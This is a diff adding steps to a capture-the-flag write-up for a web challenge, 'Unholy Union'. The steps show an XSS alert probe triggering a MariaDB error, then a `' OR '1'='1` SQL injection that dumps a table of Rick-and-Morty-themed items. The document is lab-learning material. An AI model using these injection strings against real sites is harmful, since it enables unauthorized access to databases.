@@ -134,6 +134,89 @@
 
 #### 4.2. Void Whispers - 🚩<kbd>  </kbd>
 #### 4.3. Unholy Union - 🚩<kbd>  </kbd>
+- 📂Category: Web -  XSS Vulnerability
+- ⛑️Help: Chat GPT
+- ⚔️Steps:
+	- Spawn Docker -> Insert IP Address & IP in Browser
+ 	- If we insert in the Search Box the XSS Script from the previous challenge `<script>alert('Boo!');</script>` will display the next error: <br>
+	"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'Boo!');</script>`%'' at line 1".
+ 	 - So insert in the Search Box `' OR '1'='1` (Maria DB Syntax) -> Will appear the DB.
+  	```
+   	[
+  {
+    "id": 1,
+    "name": "Plumbus",
+    "description": "A highly useful multi-purpose tool.",
+    "origin": "Planet Schlooch",
+    "created_at": "2024-10-24T09:19:42.000Z"
+  },
+  {
+    "id": 2,
+    "name": "Meeseeks Box",
+    "description": "A box that creates Meeseeks for fulfilling tasks.",
+    "origin": "Planet Meeseekon",
+    "created_at": "2024-10-24T09:19:42.000Z"
+  },
+  {
+    "id": 3,
+    "name": "Portal Gun",
+    "description": "A handheld device that creates portals between dimensions.",
+    "origin": "Earth Dimension C-137",
+    "created_at": "2024-10-24T09:19:42.000Z"
+  },
+  {
+    "id": 4,
+    "name": "Neutrino Bomb",
+    "description": "A powerful bomb capable of destroying planets.",
+    "origin": "Planet Shlorp",
+    "created_at": "2024-10-24T09:19:42.000Z"
+  },
+  {
+    "id": 5,
+    "name": "Death Crystal",
+    "description": "A crystal that shows possible death outcomes for its holder.",
+    "origin": "Froopyland",
+    "created_at": "2024-10-24T09:19:42.000Z"
+  },
+  {
+    "id": 6,
+    "name": "Space Cruiser",
+    "description": "A fast vehicle for interstellar travel.",
+    "origin": "Galactic Federation",
+    "created_at": "2024-10-24T09:19:42.000Z"
+  },
+  {
+    "id": 7,
+    "name": "Fart Knocker",
+    "description": "A vehicle used for high-speed chases.",
+    "origin": "Planet Gazorpazorp",
+    "created_at": "2024-10-24T09:19:42.000Z"
+  },
+  {
+    "id": 8,
+    "name": "Interdimensional Cable Car",
+    "description": "A vehicle capable of traveling between dimensions.",
+    "origin": "Dimension 35-C",
+    "created_at": "2024-10-24T09:19:42.000Z"
+  },
+  {
+    "id": 9,
+    "name": "Hovercraft",
+    "description": "A floating vehicle for all-terrain exploration.",
+    "origin": "Planet Squanch",
+    "created_at": "2024-10-24T09:19:42.000Z"
+  },
+  {
+    "id": 10,
+    "name": "Galactic Freight Ship",
+    "description": "A massive ship used for transporting goods across galaxies.",
+    "origin": "Alpha Centauri",
+    "created_at": "2024-10-24T09:19:42.000Z"
+  }
+]
+  	```
+ 	- Capture the Flag
+
 ---
 ## 5. Forensisc
 #### 5.1. Spooky Theme - 🚩<kbd>  </kbd>
